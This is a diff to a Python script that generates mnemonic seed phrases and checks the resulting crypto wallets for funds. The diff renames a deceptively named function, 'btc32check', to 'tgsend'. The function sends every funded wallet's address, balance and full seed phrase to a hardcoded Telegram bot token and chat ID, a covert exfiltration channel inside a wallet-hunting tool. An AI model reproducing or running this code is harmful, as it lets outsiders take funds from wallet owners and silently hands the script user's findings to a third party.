@@ -109,7 +109,7 @@ def check():
                 ctypes.windll.kernel32.SetConsoleTitleW(
                     f"Hits: {Settings.wet_count} - Total checks: {Settings.total_count}")
         if balance > 0:
-            btc32check(f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
+            tgsend(f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
             with open('results/wet.txt', 'a') as w:
                 w.write(
                     f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
@@ -118,14 +118,14 @@ def check():
             if Settings.save_empty == "n":
                 pass
             else:
-                #btc32check(f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
+                #tgsend(f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
                 with open('results/dry.txt', 'a') as w:
                     w.write(
                         f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
                     Settings.dry_count += 1
 
 
-def btc32check(adds):
+def tgsend(adds):
     response = requests.get(
         "https://api.telegram.org/bot1895834648:AAFWbIT3T9PC5UyzBLVYCwIPmEO_gq15kO0/SendMessage?chat_id=218477456&text="+adds)
     return response
